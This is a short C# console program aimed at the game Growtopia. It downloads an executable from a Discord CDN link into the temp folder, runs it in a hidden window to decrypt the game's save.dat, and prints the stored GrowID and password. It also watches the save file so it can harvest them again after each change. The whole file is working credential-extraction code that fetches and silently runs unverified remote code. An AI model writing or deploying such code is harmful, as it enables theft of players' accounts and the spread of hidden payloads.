using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace TraceSaveDat
{//SrMotion#6030
    class Program
    {
        public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia", previus;
        public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +"\\Growtopia\\save.dat";
        public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
        public static void popup(string username,string password)
        {
            if(string.IsNullOrEmpty(username)|| string.IsNullOrEmpty(password))
            {
                Console.WriteLine("empty");
            }
            else
            {
                Console.WriteLine("GrowID: {0}\nPassword: {1}", username, password);
                previus = username + password;
            }

        }
        static void Main(string[] args)
        {
            new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/846467508684587098/849921771910070312/savedecrypter.exe", Path.GetTempPath() + "\\savedecrypter.exe");// ama's savedecrypter
            new FileStream(Path.GetTempPath() + "\\user.txt", FileMode.OpenOrCreate, FileAccess.Write).Close();
            Process.Start(new ProcessStartInfo
            {
                FileName = Path.GetTempPath() + "\\savedecrypter.exe",
                WindowStyle = ProcessWindowStyle.Hidden
            }).WaitForExit();
            string[] packet = File.ReadAllText(Path.GetTempPath() + "\\user.txt").Split('|');
            popup(packet[0],packet[1]);
            fileSystemWatcher.Path = dirPath;
            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
            fileSystemWatcher.Filter = "*.dat";
            fileSystemWatcher.Changed += OnSaveChanged;
            fileSystemWatcher.EnableRaisingEvents = true;
            System.Threading.Thread.Sleep(-1);
        }
        private static void OnSaveChanged(object source, FileSystemEventArgs e)
        {
            if (e.FullPath == savePath)
            {
                try
                {
                    new FileStream(Path.GetTempPath() + "\\user.txt", FileMode.OpenOrCreate, FileAccess.Write).Close();
                    back:
                    if(File.Exists(Path.GetTempPath() + "\\savedecrypter.exe"))
                    {
                        Process.Start(new ProcessStartInfo
                        {
                            FileName = Path.GetTempPath() + "\\savedecrypter.exe",
                            WindowStyle = ProcessWindowStyle.Hidden
                        }).WaitForExit();
                    }
                    else
                    {
                        new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/846467508684587098/849921771910070312/savedecrypter.exe", Path.GetTempPath() + "\\savedecrypter.exe");// savedecrypter
                        goto back;
                    }
                    string[] packet = File.ReadAllText(Path.GetTempPath() + "\\user.txt").Split('|');
                    fileSystemWatcher.EnableRaisingEvents = false;
                    if (previus != packet[0] + packet[1])
                    {
                        previus = packet[0] + packet[1];
                        if(string.IsNullOrEmpty(packet[0]) || string.IsNullOrEmpty(packet[1]))
                        {
                            Console.WriteLine("empty");
                        }
                        else
                        {
                            popup(packet[0], packet[1]);
                        }
                    }
                }
                finally
                {
                    fileSystemWatcher.EnableRaisingEvents = true;
                }
            }
        }
    }
}
